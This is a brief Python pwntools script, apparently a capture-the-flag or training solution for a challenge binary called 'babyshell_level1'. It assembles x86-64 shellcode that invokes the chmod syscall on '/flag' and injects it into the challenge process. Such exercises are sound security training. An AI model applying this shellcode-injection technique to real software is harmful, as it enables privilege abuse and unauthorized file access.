#!/bin/pyton3

from pwn import *

context.arch = 'AMD64'
sc = asm("""
 lea rdi, [rip + _flag_addr]
 mov rsi, 7 # rw permission change
 mov rax, 90 # chmod syscall x64
 syscall

 _flag_addr:
 .ascii "/flag"
""")

p = process("/challenge/babyshell_level1")

p.send(sc)

#p.interactive()

